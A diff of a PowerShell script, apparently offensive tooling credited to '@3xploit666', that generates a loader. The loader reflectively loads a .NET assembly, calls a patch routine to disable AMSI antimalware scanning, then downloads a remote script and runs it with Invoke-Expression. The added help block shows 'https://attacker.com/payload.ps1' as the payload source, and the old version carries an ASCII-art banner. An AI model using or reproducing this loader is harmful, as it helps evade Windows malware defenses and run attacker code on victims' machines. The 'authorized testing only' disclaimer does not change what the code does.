@@ -1,49 +1,54 @@
-$startlogin = @" 
+<#
+.SYNOPSIS
+    Generates a PowerShell loader that performs AMSI resurrection bypass
+    and downloads a remote payload.
 
+.DESCRIPTION
+    Reads a .NET assembly (DLL) from disk, converts it to a byte array,
+    and generates a loader script that:
+    1. Loads the assembly via reflection
+    2. Calls [Resurrect]::Patch() to disable AMSI
+    3. Downloads and executes a remote payload
 
-              ███۞███████ ]▄▄▄▄▄▄▄▄▄▄▄▄▃
-▂▄▅█████████▅▄▃▂
-I███████████████████].
-◥⊙▲⊙▲⊙▲⊙▲⊙▲⊙▲⊙◤...
+.PARAMETER AssemblyPath
+    Path to the compiled AmsiResurrect DLL.
 
- ..../""""""""|======[]
-..../""""""""""""| 
-/"""""""""""""""""""""""""\
-\(@) (@) (@) (@) (@) (@)/
+.PARAMETER PayloadUrl
+    URL of the remote payload to download and execute after AMSI bypass.
 
-                                                                                    github.com/3xploit666
-https://www.youtube.com/channel/UCVhfRASdVtTI6k4ie6Fi9ZQ/videos
+.EXAMPLE
+    .\ConvertBytes2.ps1
+    [***PATH FILE***]: C:\path\to\AM.dll
+    [Payload URL]: https://attacker.com/payload.ps1
 
-
-  
-"@;
-Write-Host $startlogin -ForegroundColor DarkMagenta
-
-function ConvertBytes {
+.NOTES
+    Author: @3xploit666
+    For authorized security testing only.
+#>
 
 param (
-      [string]$in  = $( Read-Host "[***PATH FILE***]" ),
-      [string]$in2  = $( Read-Host "[Inserta link payload]" )
-
-     
+    [string]$AssemblyPath = $(Read-Host "[***PATH FILE***]"),
+    [string]$PayloadUrl   = $(Read-Host "[Payload URL]")
 )
 
-Start-Sleep -s 2 
+Start-Sleep -Seconds 2
 
-if (-Not (Test-Path $in)) { Read-Host "VERIFICA TU RUTA......." }
-
-$bytes  =  [System.IO.File]::ReadAllBytes($in)  -join "," 
-
-$path = "C:" + $env:HOMEPATH + "\loader.ps1"
-
-$loader =  "[System.Reflection.Assembly]::Load([byte[]]($bytes));[Resurrect]::Explo();Start-sleep -s 3; `$dow =(new-object net.webclient).DownloadString('$in2');iex `$dow"
-
-Write-Host "Archivo Generado.. en > "  $path
-
-$loader | Out-File $path
-
+if (-Not (Test-Path $AssemblyPath)) {
+    Write-Error "File not found: $AssemblyPath"
+    return
 }
 
-ConvertBytes
+$bytes = [System.IO.File]::ReadAllBytes($AssemblyPath) -join ","
+$outputPath = Join-Path $env:USERPROFILE "loader.ps1"
 
+$loader = @"
+[System.Reflection.Assembly]::Load([byte[]]($bytes))
+[AmsiResurrect.Resurrect]::Patch()
+Start-Sleep -Seconds 3
+`$payload = (New-Object Net.WebClient).DownloadString('$PayloadUrl')
+Invoke-Expression `$payload
+"@
 
+$loader | Out-File -FilePath $outputPath -Encoding UTF8
+
+Write-Host "[+] Loader generated: $outputPath" -ForegroundColor Green
